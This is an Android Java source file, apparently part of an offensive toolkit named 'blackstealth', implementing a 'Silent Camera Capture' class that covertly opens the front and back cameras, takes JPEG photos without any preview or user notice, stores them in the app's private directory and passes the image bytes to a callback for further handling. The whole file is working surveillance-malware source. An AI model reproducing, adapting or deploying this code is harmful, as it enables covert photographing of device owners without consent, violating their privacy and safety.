package com.offensive.blackstealth.media;

import android.content.Context;
import android.graphics.*;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import java.io.*;
import java.nio.ByteBuffer;
import java.util.*;
import java.util.concurrent.*;

/**
 * Silent Camera Capture
 * Takes photos from front/back camera silently
 */
public class CameraCapture {
    private static final String TAG = "CameraCapture";
    
    private Context context;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private ExecutorService executor;
    private File outputDir;
    private CaptureCallback callback;
    private String frontCameraId;
    private String backCameraId;
    private Size imageSize;
    
    public interface CaptureCallback {
        void onPhotoCaptured(byte[] imageData, boolean isFront);
        void onError(String error);
    }
    
    public CameraCapture(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.executor = Executors.newSingleThreadExecutor();
        
        outputDir = new File(context.getFilesDir(), "camera");
        outputDir.mkdirs();
        
        initializeCameras();
        startBackgroundThread();
    }
    
    public void setCallback(CaptureCallback callback) {
        this.callback = callback;
    }
    
    private void initializeCameras() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = cameraId;
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = cameraId;
                    }
                }
            }
            Log.i(TAG, "Cameras initialized - Front: " + frontCameraId + 
                  ", Back: " + backCameraId);
        } catch (Exception e) {
            Log.e(TAG, "Camera init failed: " + e.getMessage());
        }
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (Exception e) {}
        }
    }
    
    /**
     * Take photo from front camera
     */
    public void takeFrontPhoto() {
        takePhoto(frontCameraId, true);
    }
    
    /**
     * Take photo from back camera
     */
    public void takeBackPhoto() {
        takePhoto(backCameraId, false);
    }
    
    /**
     * Take photo from specified camera
     */
    private void takePhoto(String cameraId, boolean isFront) {
        if (cameraId == null) {
            if (callback != null) callback.onError("Camera not available");
            return;
        }
        
        executor.submit(() -> {
            try {
                setupCamera(cameraId);
                
                // Wait for camera to be ready
                CountDownLatch latch = new CountDownLatch(1);
                final boolean[] success = {false};
                
                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        cameraDevice = camera;
                        latch.countDown();
                    }
                    
                    @Override
                    public void onDisconnected(CameraDevice camera) {
                        camera.close();
                        latch.countDown();
                    }
                    
                    @Override
                    public void onError(CameraDevice camera, int error) {
                        camera.close();
                        latch.countDown();
                    }
                }, backgroundHandler);
                
                latch.await(5, TimeUnit.SECONDS);
                
                if (cameraDevice != null) {
                    captureImage(isFront);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Photo capture failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    private void setupCamera(String cameraId) throws CameraAccessException {
        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap map = chars.get(
            CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        
        if (map != null) {
            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes != null && sizes.length > 0) {
                // Choose a reasonable size (not too large)
                imageSize = sizes[0];
                for (Size size : sizes) {
                    if (size.getWidth() <= 1920 && size.getHeight() <= 1080) {
                        imageSize = size;
                        break;
                    }
                }
            }
        }
        
        if (imageSize == null) {
            imageSize = new Size(1280, 720);
        }
        
        imageReader = ImageReader.newInstance(
            imageSize.getWidth(), imageSize.getHeight(), ImageFormat.JPEG, 2);
    }
    
    private void captureImage(boolean isFront) {
        try {
            final CountDownLatch captureLatch = new CountDownLatch(1);
            
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] data = new byte[buffer.remaining()];
                        buffer.get(data);
                        
                        // Save to file
                        String filename = (isFront ? "front_" : "back_") + 
                                         System.currentTimeMillis() + ".jpg";
                        File file = new File(outputDir, filename);
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        
                        Log.i(TAG, "Photo captured: " + file.getName());
                        
                        if (callback != null) {
                            callback.onPhotoCaptured(data, isFront);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Image save failed: " + e.getMessage());
                } finally {
                    if (image != null) image.close();
                    captureLatch.countDown();
                }
            }, backgroundHandler);
            
            Surface surface = imageReader.getSurface();
            
            final CaptureRequest.Builder captureBuilder = 
                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(surface);
            captureBuilder.set(CaptureRequest.CONTROL_MODE, 
                CameraMetadata.CONTROL_MODE_AUTO);
            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 90);
            
            cameraDevice.createCaptureSession(Arrays.asList(surface),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        captureSession = session;
                        try {
                            session.capture(captureBuilder.build(), 
                                new CameraCaptureSession.CaptureCallback() {
                                    @Override
                                    public void onCaptureCompleted(
                                            CameraCaptureSession session,
                                            CaptureRequest request,
                                            TotalCaptureResult result) {
                                        Log.d(TAG, "Capture completed");
                                    }
                                }, backgroundHandler);
                        } catch (Exception e) {
                            Log.e(TAG, "Capture failed: " + e.getMessage());
                        }
                    }
                    
                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        Log.e(TAG, "Session config failed");
                        captureLatch.countDown();
                    }
                }, backgroundHandler);
            
            // Wait for capture to complete
            captureLatch.await(10, TimeUnit.SECONDS);
            
            // Cleanup
            closeCamera();
            
        } catch (Exception e) {
            Log.e(TAG, "Capture error: " + e.getMessage());
            if (callback != null) callback.onError(e.getMessage());
        }
    }
    
    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
    
    /**
     * Take both front and back photos
     */
    public void takeBothPhotos() {
        executor.submit(() -> {
            takePhoto(backCameraId, false);
            try { Thread.sleep(2000); } catch (Exception e) {}
            takePhoto(frontCameraId, true);
        });
    }
    
    public File getLatestPhoto() {
        File[] files = outputDir.listFiles((dir, name) -> name.endsWith(".jpg"));
        if (files != null && files.length > 0) {
            File latest = files[0];
            for (File f : files) {
                if (f.lastModified() > latest.lastModified()) {
                    latest = f;
                }
            }
            return latest;
        }
        return null;
    }
    
    public byte[] getPhotoData(File file) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            fis.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
    
    public void release() {
        closeCamera();
        stopBackgroundThread();
        executor.shutdown();
    }
}
